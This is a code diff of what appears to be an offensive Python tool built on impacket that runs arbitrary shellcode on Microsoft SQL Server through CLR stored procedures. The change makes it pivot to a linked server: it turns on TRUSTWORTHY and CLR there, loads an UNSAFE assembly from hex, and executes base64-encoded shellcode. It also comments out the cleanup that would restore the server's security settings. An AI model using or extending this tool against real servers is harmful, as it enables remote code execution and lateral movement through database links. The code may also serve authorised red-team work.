@@ -16,10 +16,11 @@ from impacket import tds
 
 if __name__ in '__main__':
     logger.init()
-    parser = argparse.ArgumentParser( add_help = True, description = 'Executes arbitrary shellcode in MSSQL using Command Language Runtime Stored Procedures.' );
+    parser = argparse.ArgumentParser( add_help = True, description = 'Executes arbitrary shellcode on an MSSQL linked server using Command Language Runtime Stored Procedures.' );
     parser.add_argument( 'target', action = 'store', help = '[[domain/]username[:password]@]<targetName or address>' );
     parser.add_argument( '-port', action = 'store', default = '1433', help = 'target MSSQL port (default 1433)' );
-    parser.add_argument( '-db', action = 'store', help = 'MSSQL database to load stored procedure into.', default = 'master' );
+    parser.add_argument( '-link', action = 'store', metavar = 'computer name', help = 'Linked MSSQL server to target.', required = True );
+    parser.add_argument( '-db', action = 'store', help = 'MSSQL database to load stored procedure into on the remote link', default = 'master' );
     parser.add_argument( '-windows-auth', action = 'store_true', default = False, help = 'whether or not use to Windows Authentication (default False)' );
     parser.add_argument( '-debug', action = 'store_true', help = 'Turn DEBUG output ON' );
     group = parser.add_argument_group( 'payload' );
@@ -73,11 +74,11 @@ if __name__ in '__main__':
             res = sql.login( options.db, username, password, domain, options.hashes, options.windows_auth );
 
         # are we trustworthy ?
-        sql.sql_query( 'SELECT CASE is_trustworthy_on WHEN 1 THEN \'ON\' ELSE \'OFF\' END FROM sys.databases WHERE name = \'{}\''.format( options.db ) );
+        sql.sql_query( "EXEC (' SELECT CASE is_trustworthy_on WHEN 1 THEN ''ON'' ELSE ''OFF'' END FROM sys.databases WHERE name = ''{}'' ') AT [{}]".format( options.db, options.link ) );
         ini_tst = True if sql.rows[0][''] == b'ON' else False
 
         # is clr support enabled?
-        sql.sql_query( 'SELECT CASE value WHEN 1 THEN \'ON\' ELSE \'OFF\' END FROM sys.configurations WHERE name = \'clr enabled\'' );
+        sql.sql_query( "EXEC (' SELECT CASE value WHEN 1 THEN ''ON'' ELSE ''OFF'' END FROM sys.configurations WHERE NAME = ''clr enabled'' ') AT [{}]".format( options.link ) );
         ini_clr = True if sql.rows[0][''] == b'ON' else False
 
         logging.info( '{} database is currently configured with trustworthy set to: {}'.format( options.db, ( 'OFF', 'ON' )[ ini_tst ] ) );
@@ -85,18 +86,18 @@ if __name__ in '__main__':
 
         # enable trustworthy setting
         if not ini_tst:
-            sql.sql_query( 'ALTER DATABASE [{}] SET TRUSTWORTHY ON'.format( options.db ) );
-            sql.sql_query( 'SELECT CASE is_trustworthy_on WHEN 1 THEN \'ON\' ELSE \'OFF\' END FROM sys.databases WHERE name = \'{}\''.format( options.db ) );
+            sql.sql_query( "EXEC (' ALTER DATABASE [{}] SET TRUSTWORTHY ON ') AT [{}]".format( options.db, options.link ) );
+            sql.sql_query( "EXEC (' SELECT CASE is_trustworthy_on WHEN 1 THEN ''ON'' ELSE ''OFF'' END FROM sys.databases WHERE name = ''{}'' ') AT [{}]".format( options.db, options.link ) );
             new_tst = True if sql.rows[0][''] == b'ON' else False
         else: new_tst = True
 
         # enable clr support
         if not ini_clr:
-            sql.sql_query( 'EXEC sp_configure \'show advanced options\', 1' );
-            sql.sql_query( 'RECONFIGURE' );
-            sql.sql_query( 'EXEC sp_configure \'clr enabled\', 1' );
-            sql.sql_query( 'RECONFIGURE' );
-            sql.sql_query( 'SELECT CASE value WHEN 1 THEN \'ON\' ELSE \'OFF\' END FROM sys.configurations WHERE name = \'clr enabled\'' );
+            sql.sql_query( "EXEC (' EXEC sp_configure ''show advanced options'', 1 ') AT [{}]".format( options.link ) )
+            sql.sql_query( "EXEC (' RECONFIGURE ') AT [{}]".format( options.link ) );
+            sql.sql_query( "EXEC (' EXEC sp_configure ''clr enabled'', 1 ') AT [{}]".format( options.link ) );
+            sql.sql_query( "EXEC (' RECONFIGURE ') AT [{}]".format( options.link ) );
+            sql.sql_query( "EXEC (' SELECT CASE value WHEN 1 THEN ''ON'' ELSE ''OFF'' END FROM sys.configurations WHERE NAME = ''clr enabled'' ') AT [{}]".format( options.link ) );
             new_clr = True if sql.rows[0][''] == b'ON' else False
         else: new_clr = True
 
@@ -119,41 +120,41 @@ if __name__ in '__main__':
 
         # create the CLR
         logging.info( 'Creating CLR {}'.format( str_clr ) );
-        sql.sql_query( 'CREATE ASSEMBLY [{}] AUTHORIZATION [dbo] FROM 0x{} WITH PERMISSION_SET = UNSAFE'.format( str_clr, clr_raw.hex() ) );
+        sql.sql_query( "EXEC (' CREATE ASSEMBLY [{}] AUTHORIZATION [dbo] FROM 0x{} WITH PERMISSION_SET = UNSAFE ') AT [{}]".format( str_clr, clr_raw.hex(), options.link ) );
         sql.printReplies();
 
         # create the procedure
         logging.info( 'Creating procedure {}'.format( str_prc ) );
-        sql.sql_query( 'CREATE PROCEDURE [dbo].[{}](@{} AS NVARCHAR(MAX)) AS EXTERNAL NAME [{}].[StoredProcedures].[ExecuteB64Payload]'.format( str_prc, str_prm, str_clr ) );
+        sql.sql_query( "EXEC (' CREATE PROCEDURE [dbo].[{}](@{} AS NVARCHAR(MAX)) AS EXTERNAL NAME [{}].[StoredProcedures].[ExecuteB64Payload] ') AT [{}]".format( str_prc, str_prm, str_clr, options.link ) );
         sql.printReplies();
 
         # execute shellcode
         logging.info( 'Execute user-supplied-shellcode of length {}'.format( len( shc_raw ) ) );
-        sql.sql_query( 'EXEC [dbo].[{}] \'{}\''.format( str_prc, base64.b64encode( shc_raw ).decode() ) );
+        sql.sql_query( "EXEC (' EXEC [dbo].[{}] ''{}'' ') AT [{}]".format( str_prc, base64.b64encode( shc_raw ).decode(), options.link ) );
         sql.printReplies();
 
         # delete the procedure
         logging.info( 'Deleting procedure {}'.format( str_prc ) );
-        sql.sql_query( 'DROP PROCEDURE [dbo].[{}]'.format( str_prc ) );
+        sql.sql_query( "EXEC (' DROP PROCEDURE [dbo].[{}] ') AT [{}]".format( str_prc, options.link ) );
         sql.printReplies();
 
         # delete the CLR
         logging.info( 'Deleting CLR {}'.format( str_clr ) );
-        sql.sql_query( 'DROP ASSEMBLY [{}]'.format( str_clr ) );
+        sql.sql_query( "EXEC (' DROP ASSEMBLY [{}] ') AT [{}]".format( str_clr, options.link ) );
         sql.printReplies();
 
         # remove trustworthy access
         if not ini_tst:
             logging.info( 'Removing trustworthy database attribute from {}'.format( options.db ) );
-            sql.sql_query( 'ALTER DATABASE [{}] SET TRUSTWORTHY {}'.format( options.db, ( 'OFF', 'ON' )[ ini_tst ] ) );
+            #sql.sql_query( 'ALTER DATABASE [{}] SET TRUSTWORTHY {}'.format( options.db, ( 'OFF', 'ON' )[ ini_tst ] ) );
 
         # remove clr support
         if not ini_clr:
             logging.info( 'Removing clr enabled support from the mssql server.' );
-            sql.sql_query( 'EXEC sp_configure \'show advanced options\', 1' );
-            sql.sql_query( 'RECONFIGURE' );
-            sql.sql_query( 'EXEC sp_configure \'clr enabled\', 0' );
-            sql.sql_query( 'RECONFIGURE' );
+            #sql.sql_query( 'EXEC sp_configure \'show advanced options\', 1' );
+            #sql.sql_query( 'RECONFIGURE' );
+            #sql.sql_query( 'EXEC sp_configure \'clr enabled\', 0' );
+            #sql.sql_query( 'RECONFIGURE' );
 
     except Exception as e:
         logging.debug( 'Exception:', exc_info = True )
